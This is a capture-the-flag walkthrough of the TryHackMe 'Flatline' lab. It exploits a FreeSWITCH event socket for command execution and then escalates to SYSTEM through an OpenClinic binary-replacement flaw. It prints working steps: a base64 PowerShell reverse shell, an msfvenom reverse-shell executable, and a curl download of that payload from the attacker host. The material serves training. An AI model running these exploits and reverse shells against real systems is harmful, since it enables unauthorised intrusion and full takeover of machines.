# [Flatline](https://tryhackme.com/r/room/flatline)

## Enumeration

We'll start using **nmap** to find open ports and checking the version of services.

```shell
$sudo nmap -p- --open -sVC -n -Pn -sS 10.10.44.53
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 09:18 -05
Nmap scan report for 10.10.44.53
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2024-05-08T14:17:05
|_Not valid after:  2024-11-07T14:17:05
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-09T14:23:50+00:00
|_ssl-date: 2024-05-09T14:23:55+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 312.83 seconds
```

## Vulnerability Exploitation

We find 2 services, the service that we can analyze is the one in the port 8021. We look for any exploit using **searchsploit** related to the service name.

```shell
$ searchsploit FreeSWITCH
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                   | windows/remote/47799.txt
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

We check the 2do exploit and see that it is an exploit in python.

```shell
$ cp /opt/exploitdb/exploits/windows/remote/47799.txt ./exploit.py
$ python3 exploit.py 10.10.44.53 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic

$ python3 exploit.py 10.10.44.53 dir
Authenticated
Content-Type: api/response
Content-Length: 2346

 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Program Files\FreeSWITCH

09/11/2021  08:38    <DIR>          .
09/11/2021  08:38    <DIR>          ..
09/11/2021  08:22    <DIR>          cert
09/11/2021  08:22    <DIR>          conf
09/05/2024  15:18    <DIR>          db
09/11/2021  08:18    <DIR>          fonts
20/08/2019  13:08         4,991,488 FreeSwitch.dll
20/08/2019  13:08            26,624 FreeSwitchConsole.exe
20/08/2019  13:19            62,976 fs_cli.exe
09/11/2021  08:18    <DIR>          grammar
09/11/2021  08:18    <DIR>          htdocs
09/11/2021  08:18    <DIR>          images
13/05/2019  07:13           293,888 ks.dll
20/08/2019  13:04           152,064 libapr.dll
20/08/2019  13:04           134,656 libaprutil.dll
20/08/2019  13:16           131,584 libbroadvoice.dll
21/03/2018  21:39         1,805,824 libeay32.dll
23/03/2019  17:37         1,050,112 libmariadb.dll
09/11/2021  08:18    <DIR>          libmariadb_plugin
20/08/2019  13:06           190,464 libpng16.dll
05/04/2018  10:18           279,552 libpq.dll
04/04/2018  18:59         1,288,192 libsndfile-1.dll
20/08/2019  13:05         1,291,776 libspandsp.dll
20/08/2019  13:04            27,648 libteletone.dll
09/05/2024  15:18    <DIR>          log
09/08/2018  12:42           283,648 lua53.dll
09/11/2021  08:18    <DIR>          mod
09/04/2018  13:36        66,362,368 opencv_world341.dll
09/11/2021  08:18           825,160 openh264.dll
20/08/2019  13:02             4,596 OPENH264_BINARY_LICENSE.txt
03/04/2018  18:31           147,456 pcre.dll
20/08/2019  13:14           313,856 pocketsphinx.dll
20/08/2019  13:10            49,152 pthread.dll
09/11/2021  08:22    <DIR>          recordings
09/11/2021  08:22    <DIR>          run
09/11/2021  08:22    <DIR>          scripts
13/05/2019  08:03           165,888 signalwire_client.dll
09/11/2021  08:18    <DIR>          sounds
20/08/2019  13:14           366,592 sphinxbase.dll
21/03/2018  21:39           349,184 ssleay32.dll
09/11/2021  08:22    <DIR>          storage
24/03/2018  21:20        15,766,528 v8.dll
24/03/2018  21:05           177,152 v8_libbase.dll
24/03/2018  21:19           134,656 v8_libplatform.dll
03/04/2018  15:01           126,976 zlib.dll
              28 File(s)     96,800,060 bytes
              17 Dir(s)  50,011,193,344 bytes free
```

Since we have remote command execution, we will try to get a rever shell.

Firt we set up a listener with `sudo nc -lvnp 443`.Then we use the rever shell #3 in base64 of https://www.revshells.com.

```shell
$ python3 exploit.py 10.10.44.53 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEAMgA0AC4AMQA5ADQAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
Authenticated
```

Now we have the reverse shell.

```shell
$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.8.124.194] from (UNKNOWN) [10.10.44.53] 49868


PS C:\Program Files\FreeSWITCH> whoami
win-eom4pk0578n\nekrotic
PS C:\Program Files\FreeSWITCH>
```

We can find both flags in the desktop of the user nekrotic, but we cannot see the flag of the user root(administrator).

```shell
PS C:\Program Files\FreeSWITCH> dir C:\Users\Nekrotic\Desktop

    Directory: C:\Users\Nekrotic\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       09/11/2021     07:39             38 root.txt                                                              
-a----       09/11/2021     07:39             38 user.txt                                                              
PS C:\Program Files\FreeSWITCH> type C:\Users\Nekrotic\Desktop\user.txt
THM{64bc****************************}
PS C:\Program Files\FreeSWITCH> type C:\Users\Nekrotic\Desktop\root.txt
PS C:\Program Files\FreeSWITCH> 
```

## Privilege Escalation

Searching in the root directory we find the openclinic project.

```shell
PS C:\Program Files\FreeSWITCH> cd C:\
PS C:\> dir

    Directory: C:\

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       15/09/2018     08:19                PerfLogs                                                              
d-r---       09/11/2021     16:41                Program Files                                                         
d-----       09/11/2021     07:13                Program Files (x86)                                                   
d-----       09/11/2021     07:18                projects                                                              
d-r---       09/11/2021     07:28                Users                                                                 
d-----       09/11/2021     16:47                Windows                                                               

PS C:\> dir projects

    Directory: C:\projects

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       09/11/2021     07:29                openclinic                                                            
```

There is are some exploits for openclinic, but we are interested in the first one.

```shell
$ searchsploit openclinic
------------------------------------------------------------- ---------------------------------
 Exploit Title                                               |  Path
------------------------------------------------------------- ---------------------------------
OpenClinic GA 5.194.18 - Local Privilege Escalation          | windows/local/50448.txt
OpenClinic GA 5.247.01 - Information Disclosure              | php/webapps/51994.md
OpenClinic GA 5.247.01 - Path Traversal (Authenticated)      | php/webapps/51995.md
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
$ cat /opt/exploitdb/exploits/windows/local/50448.txt
...
                                # Proof of Concept

1. Generate malicious .exe on attacking machine
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4242 -f exe > /var/www/html/mysqld_evil.exe

2. Setup listener and ensure apache is running on attacking machine
    nc -lvp 4242
    service apache2 start

3. Download malicious .exe on victim machine
    type on cmd: curl http://192.168.1.102/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"

4. Overwrite file and copy malicious .exe.
    Renename C:\projects\openclinic\mariadb\bin\mysqld.exe > mysqld.bak
    Rename downloaded 'mysqld_evil.exe' file in mysqld.exe

5. Restart victim machine

6. Reverse Shell on attacking machine opens
    C:\Windows\system32>whoami
    whoami
    nt authority\system
```

We follow the sequence of steps indicated.

In my local pc generate the malicious .exe y create the http server to then download it to the target pc.

```shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.124.194 LPORT=4242 -f exe > ./mysqld_evil.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
$ ls
exploit.py  mysqld_evil.exe
$ sudo systemctl start apache2
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.44.53 - - [09/May/2024 10:12:47] "GET /mysqld_evil.exe HTTP/1.1" 200 -

```

In the target pc download the malicious .exe, we reorganize the files as indicated in the steps and restart the computer.

```shell
PS C:\Program Files\FreeSWITCH> curl http://10.8.124.194:8080/mysqld_evil.exe -o "C:\projects\openclinic\mariadb\bin\mysqld_evil.exe"
PS C:\Program Files\FreeSWITCH> cd C:\projects\openclinic\mariadb\bin
PS C:\projects\openclinic\mariadb\bin> dir                 

    Directory: C:\projects\openclinic\mariadb\bin

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
...
-a----       22/03/2021     23:47          26600 mysqld.exe                                                            
-a----       22/03/2021     23:46        3532776 mysqldump.exe                                                         
-a----       22/03/2021     23:37           8478 mysqldumpslow.pl                                                      
-a----       09/05/2024     16:30          73802 mysqld_evil.exe                                                       
...

PS C:\projects\openclinic\mariadb\bin> Rename-Item -Path ./mysqld.exe -NewName mysqld.bak

PS C:\projects\openclinic\mariadb\bin> Rename-Item -Path ./mysqld_evil.exe -NewName ./mysqld.exe

PS C:\projects\openclinic\mariadb\bin> dir

    Directory: C:\projects\openclinic\mariadb\bin

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
...
-a----       22/03/2021     23:47          26600 mysqld.bak                                                            
-a----       09/05/2024     16:30          73802 mysqld.exe                                                            
...

PS C:\projects\openclinic\mariadb\bin> Restart-Computer

```

Finally we should wait using `sudo nc -lvp 4242` and now we are "root".

```shell
$ sudo nc -lvp 4242
listening on [any] 4242 ...

10.10.44.53: inverse host lookup failed: Unknown host
connect to [10.8.124.194] from (UNKNOWN) [10.10.44.53] 49671

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Nekrotic\Desktop\root.txt
type C:\Users\Nekrotic\Desktop\root.txt
THM{8c8b****************************} 

```
